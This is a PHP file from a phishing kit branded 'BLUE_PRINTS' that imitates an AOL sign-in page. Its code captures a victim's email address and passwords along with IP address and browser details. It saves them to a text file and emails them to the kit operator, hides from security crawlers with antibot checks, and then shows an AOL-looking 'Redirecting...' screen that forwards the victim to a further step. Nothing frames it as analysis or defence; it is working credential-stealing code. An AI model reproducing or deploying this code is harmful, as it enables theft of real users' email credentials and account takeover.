<?php
error_reporting(0);

session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    } 
    include '../../crawlerdetect.php';
$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['value'];

if(!empty($_SESSION['email']))  {

$useremail = $_SESSION['email'];
 
}

if(!empty($_POST['password']))  {

$pass = $_POST['password'];

date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

include "../../step/conf/config.php";

$msg =  $_SESSION['msg'];
$msg .= "+ ------------------------------------------+\n";
$msg .= "|   💵BLUE_PRINTS | Aol Login Details \n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| 📧 EMAIL  :  ".$useremail."\n";
$msg .= "| 🔑 PASS   :  ".$_SESSION['password']."\n";
$msg .= "| 🔑 PASS 2 :  ".$pass."\n"; 
$footer = "+ ------------------------------------------+\n";
$footer .= "+ IP => $ip \n  USERAGENT => $agent\n";
$footer .= "+ ------------------------------------------+\n\n";

$data = $msg . $footer;
if($savetxt == "on"){
$save=fopen("../../step/data/email".$salt.".txt",'a');
	          fwrite($save,$data );
	          fclose($save);
             
           }

$_SESSION['emailr'] = $msg;

$subject="Email 1NFO By BLUE_PR1NTS=> {$_SESSION['ip']} [ {$_SESSION['platform']} ]";
$headers="From: BLUE_PR1NTS <VR1D14N@BLUE_PRINTS1.com>\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
@mail($emailzz, $subject, $data, $headers);
       
}
$urlss ="../../info.php?";
?>

<html id="Stencil" class="js grid light-theme "><head>
<meta http-equiv="refresh" content="5;URL='<?php echo $urlss; ?>value=<?php echo $hash; ?>'" />
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
      <meta name="format-detection" content="telephone=no">
      <meta name="referrer" content="origin-when-cross-origin">
      <title>AOL</title>
     <link rel="shortcut icon" type="image/png" href="aol/fav.png">
      <style nonce="">
         #mbr-css-check {
         display: inline;
         }
         .mbr-legacy-device-bar {
         display: none;
         }
      </style>
      <link href="aol/aol-main.css" rel="stylesheet" type="text/css">

   </head>
   <body class="">
      <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
         <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
         <input type="checkbox" id="mbr-legacy-device-bar-cross">
         <p class="mbr-legacy-device">
            AOL works best with the latest versions of browsers. You're using an out-of-date or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="https://login.aol.com/account/challenge/password?done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Frequest_auth%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2520ycal-w%2520openid%2520openid2%2520mail-w%2520mail-x%2520sdps-r%2520msgr-w%26src%3Dmail%26language%3Den-GB%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL19jcXIvbG9naW5TdWNjZXNzPyZzaXRlU3RhdGU9dXYlM0FBT0wlM0JydCUzQVNURCUzQmF0JTNBU05TJTNCbGMlM0Flbl9HQiUzQmxkJTNBbWFpbC5hb2wuY28udWslM0JzbnQlM0FTY3JlZW5OYW1lJTNCc2lkJTNBODZiNmYzYzAtMDQ3Yy00NGRhLTkyMDItNzgwZDU0MDg5MTc2JTNCcXAlM0FpY2lkJTNEbmF2LXVraHAlM0ImbGFuZz1lbiZsb2NhbGU9R0IifQ.RyMWL5YIKSCqvbLpPKHs3Qo0Fi20f5GCKVV70B3yw_81RIq5l51rjpEDqtz233ayokmQU9cpag6-tTKZS7wSpAJfF_NCreJ0FMaL_yB3tpDNr0U35R1ICfAX8veKZYDrsrOXdLGcts_k0jxuf3-qnUZsmDQmCJ2Nh1Gq3BnWGD8%26nonce%3DVqCNooVPDjunkHmY9KHobrBhdSoU0Sxd&amp;src=mail&amp;redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback&amp;lang=en-GB&amp;client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&amp;language=en-GB&amp;authMechanism=primary&amp;display=login&amp;sessionIndex=Qg--&amp;acrumb=ZU9ZCHU7">More&nbsp;info</a>
         </p>
      </div>
     
      <div id="login-body" class="loginish  puree-v2 responsive">
         <div class="mbr-desktop-hd">
            <span class="column">
            <a href="https://www.aol.co.uk/">
            <img src="aol/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
            <img src="aol/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="">
            </a>
            </span>
            <span class="column help txt-align-right">
            <a href="https://help.aol.co.uk/">Help</a>
            </span>
         </div>
         <div class="login-box-container">
            <div class="login-box default">
               <div class="mbr-login-hd txt-align-center">
                  <img src="aol/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-GB" width="100" height="">
                  <img src="aol/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-GB" width="100" height="">
               </div>
               <div class="challenge password-challenge">
                  <div class="challenge-header">
                     <div class="yid"><?php echo $useremail; ?></div>
                  </div>
                  <div id="password-challenge" class="primary">
                     <strong class="challenge-heading" style="
    margin-bottom: 20px;
">Redirecting...</strong>
                     <img src="./aol/spin.gif" style="display: block; margin-left: auto; margin-right: auto">
                     
                  </div>
               </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
               <h1></h1>
               <p></p>
            </div>
         </div>

      </div>


   
      <div id="mbr-css-check"></div>
   
</body></html>